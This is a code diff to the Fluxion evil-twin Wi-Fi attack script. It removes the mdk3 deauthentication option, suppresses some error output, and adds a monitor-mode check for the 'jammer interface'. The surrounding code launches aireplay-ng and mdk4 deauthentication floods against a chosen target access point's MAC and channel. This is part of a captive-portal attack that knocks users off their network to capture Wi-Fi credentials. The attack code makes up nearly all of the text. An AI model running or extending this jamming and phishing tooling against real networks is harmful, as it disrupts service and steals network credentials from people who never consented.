@@ -154,7 +154,7 @@ function captive_portal_unset_ap_service() {
 
 function captive_portal_set_ap_service() {
   if [ "$CaptivePortalAPService" ]; then
-    if ! type -t ap_service_start; then
+    if ! type -t ap_service_start &> /dev/null; then
       # AP Service: Load the service's helper routines.
       source "$FLUXIONLibPath/ap/$CaptivePortalAPService.sh"
     fi
@@ -171,7 +171,6 @@ fluxion_header
 echo -e "$FLUXIONVLine ${CClr}Select a method of deauthentication\n${CClr}"
 echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4${CClr}"
 echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay${CClr}"
-echo -e "${CSRed}[${CSYel}3${CSRed}]${CClr} mdk3\n${CClr}"
 read -p $'\e[0;31m[\e[1;34mfluxion\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;31m-\e[0;31m[\e[1;33m~\e[0;31m] \e[0m' option_deauth
 
 
@@ -1146,7 +1145,7 @@ captive_portal_unset_routes() {
   fi
 
   if [ "$CaptivePortalAccessInterface" ] && [ "$CaptivePortalGatewayAddress" ]; then
-    ip addr del "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface"
+    ip addr del "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface" 2>/dev/null
   fi
 }
 
@@ -1296,6 +1295,9 @@ unprep_attack() {
   captive_portal_unset_authenticator
   captive_portal_unset_ap_interface
   captive_portal_unset_jammer_interface
+
+  # Always return success to allow tracker channel change handling to continue
+  return 0
 }
 
 prep_attack() {
@@ -1559,6 +1561,21 @@ start_attack() {
   echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
   echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk4_blacklist.lst"
 
+  # Ensure jammer interface is in monitor mode before starting
+  # This prevents "ARPHRD_IEEE80211" errors during tracker restarts
+  # Only set mode if not already in monitor mode to avoid disrupting the interface
+  echo "Verifying jammer interface monitor mode..." > $FLUXIONOutputDevice
+  local currentMode=$(iw dev "$CaptivePortalJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
+  if [ "$currentMode" != "monitor" ]; then
+    echo "Setting jammer interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
+    if ! interface_set_mode "$CaptivePortalJammerInterface" monitor &> $FLUXIONOutputDevice; then
+      echo "Warning: Failed to set jammer interface to monitor mode" > $FLUXIONOutputDevice
+    fi
+    sleep 1
+  else
+    echo "Jammer interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
+  fi
+
   if [ $FLUXIONEnable5GHZ -eq 1 ]; then
     xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
@@ -1577,14 +1594,6 @@ start_attack() {
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface" &
-        # Save parent's pid, to get to child later.
-    	CaptivePortalJammerServiceXtermPID=$!
-
-  elif [[ $option_deauth -eq 3 ]]; then
-
-	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   fi
